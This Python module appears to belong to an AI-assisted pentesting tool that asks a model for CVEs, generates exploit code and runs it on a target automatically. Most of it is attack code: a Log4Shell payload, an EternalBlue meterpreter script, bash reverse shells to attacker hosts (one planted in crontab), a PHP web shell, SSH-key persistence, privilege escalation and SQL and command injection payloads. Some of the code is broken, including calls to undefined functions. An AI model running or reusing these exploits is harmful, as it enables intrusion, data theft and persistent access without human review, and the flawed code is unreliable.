import random
import string
import tempfile
import subprocess
import json
import re
import os
from datetime import datetime
from inference import PentestAI

def generate_adaptive_exploit(target, vulnerability_data, open_ports, successful_creds=None, conversational_ai=None):
    """
    Use PentestAI's ExploitDB and CVE knowledge to generate targeted exploits
    """
    adaptive_exploits = []
    
    # Initialize the AI model
    ai = PentestAI(conversational_ai=conversational_ai)
    
    # Process each discovered vulnerability with AI analysis
    for vuln in vulnerability_data.get('vulnerabilities', []):
        exploit_result = analyze_vulnerability_for_exploit(ai, vuln, target, open_ports)
        if exploit_result:
            adaptive_exploits.append(exploit_result)
    
    # Analyze service banners for known CVEs
    for port, port_info in open_ports.items():
        service_banner = port_info.get('service_guess', '') + ' ' + port_info.get('version', '')
        if service_banner.strip():
            banner_exploit = analyze_service_banner_for_cves(ai, service_banner, port, target)
            if banner_exploit:
                adaptive_exploits.append(banner_exploit)
    
    # Generate chained exploits using successful credentials
    if successful_creds:
        chained_exploit = generate_credential_based_exploit_chain(ai, target, successful_creds, open_ports)
        if chained_exploit:
            adaptive_exploits.append(chained_exploit)
    
    return {
        "adaptive_exploits": adaptive_exploits,
        "summary": f"Generated {len(adaptive_exploits)} AI-powered adaptive exploits for {target}"
    }

def analyze_vulnerability_for_exploit(ai, vulnerability, target, open_ports):
    """
    Use AI to analyze vulnerability and generate specific exploit
    """
    try:
        # Construct detailed vulnerability context for AI
        vuln_context = f"""
        Target: {target}
        Vulnerability: {vulnerability.get('name', 'Unknown')}
        Port: {vulnerability.get('port', 'Unknown')}
        Severity: {vulnerability.get('severity', 'Unknown')}
        Description: {vulnerability.get('description', 'No description')}
        Evidence: {vulnerability.get('evidence', 'No evidence')}
        
        Available ports: {list(open_ports.keys())}
        
        Based on your ExploitDB and CVE knowledge, generate a specific exploit for this vulnerability.
        Include CVE references, exploit techniques, and payload suggestions.
        """
        
        # Get AI analysis
        analysis = ai.analyze_target(vuln_context)
        
        # Parse AI response for exploit information
        exploit_info = extract_exploit_from_ai_response(analysis, vulnerability)
        
        if exploit_info:
            # Generate actual exploit code based on AI analysis
            exploit_code = generate_exploit_code_from_ai_analysis(exploit_info, vulnerability, target)
            execution_results = execute_exploit(exploit_code, target)
            
            return {
                "technique": "AI-Generated CVE Exploit",
                "vulnerability": vulnerability.get('name'),
                "cve_references": exploit_info.get('cve_references', []),
                "exploit_type": exploit_info.get('exploit_type', 'Unknown'),
                "status": execution_results.get("status"),
                "exploit_code": exploit_code,
                "execution_output": execution_results.get("output"),
                "ai_analysis": analysis,
                "details": f"Generated and executed exploit for {vulnerability.get('name')} using AI CVE knowledge"
            }
    
    except Exception as e:
        return {
            "technique": "AI Exploit Generation",
            "status": "failed",
            "details": f"Error generating exploit: {str(e)}"
        }

def analyze_service_banner_for_cves(ai, service_banner, port, target):
    """
    Analyze service banner against CVE database using AI
    """
    try:
        # Construct service analysis context
        service_context = f"""
        Target: {target}
        Port: {port}
        Service Banner: {service_banner}
        
        Based on your CVE database knowledge, identify known vulnerabilities for this service.
        Provide CVE numbers, exploit availability, and recommended attack vectors.
        Focus on exploitable vulnerabilities with public PoCs.
        """
        
        analysis = ai.analyze_target(service_context)
        
        # Extract CVE information from AI response
        cve_info = extract_cve_info_from_response(analysis)
        
        if cve_info and cve_info.get('cves'):
            # Generate exploit for the most critical CVE
            critical_cve = select_most_exploitable_cve(cve_info['cves'])
            
            if critical_cve:
                exploit_code = generate_cve_exploit(critical_cve, service_banner, port, target)
                execution_results = execute_exploit(exploit_code, target)
                
                return {
                    "technique": "AI-Powered CVE Exploitation",
                    "service": service_banner,
                    "port": port,
                    "identified_cves": cve_info['cves'],
                    "exploited_cve": critical_cve,
                    "status": execution_results.get("status"),
                    "exploit_code": exploit_code,
                    "execution_output": execution_results.get("output"),
                    "ai_analysis": analysis,
                    "details": f"Generated and executed exploit for {critical_cve} in {service_banner}"
                }
    
    except Exception as e:
        return {
            "technique": "CVE Analysis",
            "status": "failed", 
            "details": f"Error analyzing service for CVEs: {str(e)}"
        }

def generate_credential_based_exploit_chain(ai, target, successful_creds, open_ports):
    """
    Generate sophisticated exploit chains using discovered credentials
    """
    try:
        # Construct credential chain context
        chain_context = f"""
        Target: {target}
        Successful Credentials: {successful_creds}
        Open Ports: {list(open_ports.keys())}
        
        Generate a multi-stage exploit chain using these credentials.
        Consider privilege escalation, lateral movement, and persistence.
        Include specific commands and techniques from your exploit knowledge.
        """
        
        analysis = ai.analyze_target(chain_context)
        
        # Generate multi-stage exploit chain
        exploit_chain = generate_multi_stage_chain(analysis, successful_creds, target, open_ports)
        
        return {
            "technique": "AI-Generated Exploit Chain",
            "credentials_used": successful_creds,
            "stages": len(exploit_chain.get('stages', [])),
            "status": "generated",
            "exploit_chain": exploit_chain,
            "ai_analysis": analysis,
            "details": f"Generated {len(exploit_chain.get('stages', []))} stage exploit chain"
        }
    
    except Exception as e:
        return {
            "technique": "Exploit Chain Generation",
            "status": "failed",
            "details": f"Error generating exploit chain: {str(e)}"
        }

def extract_exploit_from_ai_response(ai_response, vulnerability):
    """
    Parse AI response to extract structured exploit information
    """
    try:
        response_text = str(ai_response)
        
        # Extract CVE references
        cve_pattern = r'CVE-\d{4}-\d{4,7}'
        cve_references = re.findall(cve_pattern, response_text)
        
        # Extract exploit types
        exploit_types = []
        if 'buffer overflow' in response_text.lower():
            exploit_types.append('buffer_overflow')
        if 'sql injection' in response_text.lower():
            exploit_types.append('sql_injection')
        if 'command injection' in response_text.lower():
            exploit_types.append('command_injection')
        if 'remote code execution' in response_text.lower():
            exploit_types.append('rce')
        if 'privilege escalation' in response_text.lower():
            exploit_types.append('privilege_escalation')
        
        return {
            'cve_references': cve_references,
            'exploit_type': exploit_types[0] if exploit_types else 'generic',
            'ai_confidence': extract_confidence_score(response_text),
            'recommended_tools': extract_recommended_tools(response_text)
        }
    
    except Exception:
        return None

def extract_cve_info_from_response(ai_response):
    """
    Extract CVE information from AI analysis response
    """
    try:
        response_text = str(ai_response)
        
        # Extract CVE numbers with details
        cve_pattern = r'(CVE-\d{4}-\d{4,7})'
        cves = []
        
        for cve in re.findall(cve_pattern, response_text):
            # Extract CVSS score if mentioned
            cvss_pattern = rf'{cve}.*?(\d+\.\d+)'
            cvss_match = re.search(cvss_pattern, response_text)
            cvss_score = float(cvss_match.group(1)) if cvss_match else 0.0
            
            # Check for exploit availability indicators
            exploit_available = any(term in response_text.lower() for term in [
                'exploit available', 'public poc', 'metasploit', 'exploitdb'
            ])
            
            cves.append({
                'cve_id': cve,
                'cvss_score': cvss_score,
                'exploit_available': exploit_available,
                'extract_context': extract_cve_context(response_text, cve)
            })
        
        return {'cves': cves} if cves else None
    
    except Exception:
        return None

def select_most_exploitable_cve(cves):
    """
    Select the most exploitable CVE based on AI analysis
    """
    # Sort by exploitability factors
    def exploitability_score(cve):
        score = 0
        score += cve.get('cvss_score', 0) * 10  # Higher CVSS = more critical
        score += 50 if cve.get('exploit_available') else 0  # Boost if exploit exists
        return score
    
    if not cves:
        return None
    
    sorted_cves = sorted(cves, key=exploitability_score, reverse=True)
    return sorted_cves[0]['cve_id']

def generate_exploit_code_from_ai_analysis(exploit_info, vulnerability, target):
    """
    Generate actual exploit code based on AI analysis
    """
    exploit_type = exploit_info.get('exploit_type', 'generic')
    port = vulnerability.get('port', 80)
    
    if exploit_type == 'buffer_overflow':
        return generate_buffer_overflow_exploit(target, port, exploit_info)
    elif exploit_type == 'sql_injection':
        return generate_sql_injection_exploit(target, port, exploit_info)
    elif exploit_type == 'command_injection':
        return generate_command_injection_exploit(target, port, exploit_info)
    elif exploit_type == 'rce':
        return generate_rce_exploit(target, port, exploit_info)
    else:
        return generate_generic_exploit(target, port, exploit_info)

def generate_cve_exploit(cve_id, service_banner, port, target):
    """
    Generate specific exploit code for a CVE
    """
    # Common CVE exploit templates
    cve_exploits = {
        'CVE-2021-44228': generate_log4j_exploit(target, port),  # Log4Shell
        'CVE-2020-1472': generate_zerologon_exploit(target),     # Zerologon
        'CVE-2017-0144': generate_eternalblue_exploit(target),   # EternalBlue
        'CVE-2019-0708': generate_bluekeep_exploit(target),      # BlueKeep
        'CVE-2021-34527': generate_printnightmare_exploit(target), # PrintNightmare
    }
    
    # Check for specific CVE exploit
    for known_cve, exploit_func in cve_exploits.items():
        if known_cve in cve_id:
            return exploit_func
    
    # Generate generic exploit based on service type
    if 'apache' in service_banner.lower():
        return generate_apache_exploit(target, port, cve_id)
    elif 'nginx' in service_banner.lower():
        return generate_nginx_exploit(target, port, cve_id)
    elif 'iis' in service_banner.lower():
        return generate_iis_exploit(target, port, cve_id)
    elif 'ssh' in service_banner.lower():
        return generate_ssh_exploit(target, port, cve_id)
    else:
        return generate_service_generic_exploit(target, port, cve_id, service_banner)

def generate_multi_stage_chain(ai_analysis, credentials, target, open_ports):
    """
    Generate multi-stage exploit chain based on AI analysis
    """
    stages = []
    
    # Stage 1: Initial Access
    stages.append({
        "stage": 1,
        "name": "Initial Access",
        "technique": "Credential Authentication",
        "commands": [
            f"ssh {credentials[0]['user']}@{target}",
            "whoami && id && pwd"
        ],
        "description": "Establish initial foothold using discovered credentials"
    })
    
    # Stage 2: Enumeration
    stages.append({
        "stage": 2,
        "name": "Post-Exploitation Enumeration", 
        "technique": "System Discovery",
        "commands": [
            "uname -a",
            "sudo -l",
            "find / -perm -4000 2>/dev/null",
            "netstat -antlp",
            "ps aux"
        ],
        "description": "Enumerate system for privilege escalation vectors"
    })
    
    # Stage 3: Privilege Escalation (based on AI analysis)
    privesc_technique = extract_privesc_technique_from_ai(ai_analysis)
    stages.append({
        "stage": 3,
        "name": "Privilege Escalation",
        "technique": privesc_technique,
        "commands": generate_privesc_commands(privesc_technique),
        "description": f"Escalate privileges using {privesc_technique}"
    })
    
    # Stage 4: Persistence
    stages.append({
        "stage": 4,
        "name": "Persistence",
        "technique": "SSH Key Installation",
        "commands": [
            "mkdir -p ~/.ssh",
            "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...' >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys"
        ],
        "description": "Establish persistent access via SSH key"
    })
    
    return {"stages": stages, "total_stages": len(stages)}

# Helper functions for specific exploit generation
def generate_log4j_exploit(target, port):
    return f"""
# Log4Shell (CVE-2021-44228) Exploit
import requests

# JNDI LDAP payload
payload = "${{jndi:ldap://attacker.com:1389/Exploit}}"

# Common injection points
headers = {{
    'User-Agent': payload,
    'X-Api-Version': payload,
    'X-Forwarded-For': payload
}}

# Send exploit
response = requests.get(f"http://{target}:{port}/", headers=headers)
print(f"Exploit sent to {target}:{port}")
"""

def generate_eternalblue_exploit(target):
    return f"""
# EternalBlue (CVE-2017-0144) Exploit
# Using Metasploit framework

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
"""

def generate_buffer_overflow_exploit(target, port, exploit_info):
    return f"""
# Buffer Overflow Exploit for {target}:{port}
import socket

# Crafted payload with NOP sled and shellcode
buffer_size = 1024
nop_sled = b"\\x90" * 200
shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80"
padding = b"A" * (buffer_size - len(nop_sled) - len(shellcode))
exploit = padding + nop_sled + shellcode

# Send exploit
s = socket.socket()
s.connect(("{target}", {port}))
s.send(exploit)
s.close()
"""

def extract_confidence_score(response_text):
    """Extract confidence score from AI response"""
    confidence_patterns = [
        r'confidence[:\s]+(\d+)%',
        r'(\d+)%\s+confidence',
        r'certainty[:\s]+(\d+)%'
    ]
    
    for pattern in confidence_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return int(match.group(1))
    
    return 50  # Default confidence

def extract_recommended_tools(response_text):
    """Extract recommended tools from AI response"""
    tools = []
    tool_patterns = [
        r'metasploit',
        r'nmap',
        r'burp suite',
        r'sqlmap',
        r'nikto',
        r'dirb',
        r'gobuster'
    ]
    
    for pattern in tool_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            tools.append(pattern)
    
    return tools

def extract_cve_context(response_text, cve_id):
    """Extract context around CVE mention"""
    # Find sentence containing CVE
    sentences = response_text.split('.')
    for sentence in sentences:
        if cve_id in sentence:
            return sentence.strip()
    return ""

def extract_privesc_technique_from_ai(ai_analysis):
    """Extract privilege escalation technique from AI analysis"""
    response_text = str(ai_analysis).lower()
    
    if 'sudo' in response_text:
        return "sudo_exploitation"
    elif 'suid' in response_text:
        return "suid_binary"
    elif 'kernel' in response_text:
        return "kernel_exploit"
    elif 'cron' in response_text:
        return "cron_job"
    else:
        return "generic_privesc"

def generate_privesc_commands(technique):
    """Generate privilege escalation commands based on technique"""
    commands = {
        "sudo_exploitation": [
            "sudo -l",
            "sudo /bin/bash"
        ],
        "suid_binary": [
            "find / -perm -4000 2>/dev/null",
            "/usr/bin/find . -exec /bin/sh \\; -quit"
        ],
        "kernel_exploit": [
            "uname -a",
            "searchsploit linux kernel",
            "./kernel_exploit"
        ],
        "cron_job": [
            "cat /etc/crontab",
            "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> /etc/crontab"
        ],
        "generic_privesc": [
            "whoami",
            "id",
            "sudo -l"
        ]
    }
    
    return commands.get(technique, commands["generic_privesc"])

# Additional exploit generators for specific services
def generate_apache_exploit(target, port, cve_id):
    return f"# Apache exploit for {cve_id}\ncurl -X POST http://{target}:{port}/cgi-bin/vulnerable.cgi -d 'payload'"

def generate_nginx_exploit(target, port, cve_id):
    return f"# Nginx exploit for {cve_id}\ncurl -H 'Host: {target}' http://{target}:{port}/..%2f..%2fetc%2fpasswd"

def generate_iis_exploit(target, port, cve_id):
    return f"# IIS exploit for {cve_id}\ncurl http://{target}:{port}/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir"

def generate_ssh_exploit(target, port, cve_id):
    return f"# SSH exploit for {cve_id}\nssh -o UserKnownHostsFile=/dev/null {target} -p {port}"

def generate_service_generic_exploit(target, port, cve_id, service_banner):
    return f"""
# Generic exploit for {service_banner}
# CVE: {cve_id}
# Target: {target}:{port}

import socket
s = socket.socket()
s.connect(("{target}", {port}))
s.send(b"EXPLOIT_PAYLOAD\\r\\n")
response = s.recv(1024)
print(response)
s.close()
"""

def generate_sql_injection_exploit(target, port, exploit_info):
    return f"""
# SQL Injection Exploit for {target}:{port}
import requests

# SQL injection payloads
payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users --"
]

for payload in payloads:
    url = f"http://{target}:{port}/login.php"
    data = {{"username": payload, "password": "test"}}
    response = requests.post(url, data=data)
    print(f"Payload: {{payload}}")
    print(f"Response: {{response.text[:200]}}")
"""

def generate_command_injection_exploit(target, port, exploit_info):
    return f"""
# Command Injection Exploit for {target}:{port}
import requests

# Command injection payloads
payloads = [
    "; whoami",
    "| id",
    "&& uname -a",
    "; cat /etc/passwd"
]

for payload in payloads:
    url = f"http://{target}:{port}/exec.php"
    data = {{"cmd": f"ping {payload}"}}
    response = requests.post(url, data=data)
    print(f"Payload: {{payload}}")
    print(f"Response: {{response.text[:200]}}")
"""

def generate_rce_exploit(target, port, exploit_info):
    return f"""
# Remote Code Execution Exploit for {target}:{port}
import requests

# RCE payload
payload = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

url = f"http://{target}:{port}/upload.php"
files = {{"file": ("shell.php", f"<?php system('{payload}'); ?>")}}
response = requests.post(url, files=files)
print(f"RCE payload sent to {target}:{port}")
"""

def execute_exploit(exploit_code, target):
    """
    Executes the generated exploit code in a controlled environment.
    """
    results = {}
    try:
        # Create a temporary file to store the exploit code
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(exploit_code)
            exploit_path = f.name

        # Execute the exploit code using subprocess
        process = subprocess.Popen(
            ["python", exploit_path, target],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate(timeout=60)

        # Clean up the temporary file
        os.remove(exploit_path)

        if process.returncode == 0:
            results["status"] = "success"
            results["output"] = stdout
        else:
            results["status"] = "failed"
            results["output"] = stderr

    except Exception as e:
        results["status"] = "error"
        results["output"] = str(e)

    return results
